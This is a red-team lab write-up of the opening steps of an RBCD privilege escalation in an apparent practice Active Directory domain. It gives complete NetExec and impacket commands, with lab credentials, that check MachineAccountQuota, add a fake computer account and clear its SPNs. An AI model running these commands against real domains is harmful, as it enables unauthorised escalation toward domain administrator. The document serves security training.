# 🏛️ Case 004: Privilege Escalation (Resource-Based Constrained Delegation)
📑 Executive Summary
Objective: To escalate privileges from a standard domain user to a local administrator on a target server by exploiting the MachineAccountQuota and Resource-Based Constrained Delegation (RBCD).

Scenario: The attacker uses the compromised jon.snow account to create a new machine account and configures it to act on behalf of other identities to impersonate a Domain Admin.

Attack Tools: NetExec (nxc), impacket-addcomputer, and impacket-rbcd.

⚔️ Red Team: Attack Simulation
1. Exploiting MachineAccountQuota (T1087.002)
The attacker verified that any domain user can add up to 10 machine accounts to the domain.

Command: nxc ldap 192.168.58.11 -u jon.snow -p iknownothing -M maq
<img width="1919" height="146" alt="image" src="https://github.com/user-attachments/assets/3481a70e-4c18-4e01-8c34-2ac747a1db86" />

Result: Confirmed MachineAccountQuota: 10.

2. Creating a Fake Computer Account
Using the jon.snow credentials, the attacker adds a new computer object to the domain to be used as a "controlled" identity.

Command:  addcomputer.py -computer-name 'SYSKEY$' -computer-pass 'Password123!' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'

#### Result: Successfully added machine account SYSKEY$ with password Password123!
<img width="1919" height="152" alt="image" src="https://github.com/user-attachments/assets/deed48d5-0029-4d39-b54a-46b6fc4617c6" />

### 3. Modifying the Attacker Machine Account (T1098)
The attacker utilized the krbrelayx suite to interact with the Domain Controller (WINTERFELL) and clear the SPNs associated with the recently created SYSKEY$ account.

Command: python3 addspn.py --clear -t 'SYSKEY$' -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' 'winterfell.north.sevenkingdoms.local'

Action: Successfully connected to the host and cleared the servicePrincipalName attribute for CN=SYSKEY,CN=Computers,DC=north,DC=sevenkingdoms,DC=local.

Impact: Clearing these attributes ensures that the machine account is in a "clean" state before the attacker attempts to configure it for impersonation against a target service.
